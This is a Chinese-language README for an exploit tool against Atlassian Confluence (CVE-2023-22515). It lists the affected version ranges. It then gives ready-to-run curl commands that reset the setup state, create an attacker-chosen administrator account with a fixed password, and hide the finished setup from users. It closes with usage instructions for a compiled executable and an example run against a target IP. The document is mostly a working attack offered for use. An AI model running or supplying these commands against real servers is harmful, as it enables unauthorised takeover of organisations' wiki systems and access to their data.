# Confluence未授权添加管理员用户(CVE-2023-22515)漏洞利用工具

## 漏洞影响

```
8.0.0 <= Atlassian Confluence < 8.3.3
8.4.0 <= Atlassian Confluence < 8.4.3
8.5.0 <= Atlassian Confluence < 8.5.2
```

## 漏洞利用

触发漏洞
```
curl -vk http://IP/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false
```

创建管理员用户
```
test123 Password2
```
执行如下命令
```
curl -vk -X POST -H "X-Atlassian-Token: no-check" --data-raw "username=test123&fullName=test123&email=test123@localhost&password=Password2&confirm=Password2&setup-next-button=Next" http://IP/setup/setupadministrator.action
```

避免向所有用户显示一条消息，表明设置已完成
```
curl -vk -X POST -H "X-Atlassian-Token: no-check" http://IP/setup/finishsetup.action
```





## 用法

```
cve-2023-22515.exe
Usage of cve-2023-22515.exe:
  -pass string
        指定要添加的密码
  -proxy string
        设置代理
  -u string
        指定目标
  -user string
        指定要添加的用户名
```

例如：

```
cve-2023-22515.exe -u http://10.108.3.117:8090 -user tesxe17 -pass Password2
```

![image-20231011164858593](images/image-20231011164858593.png)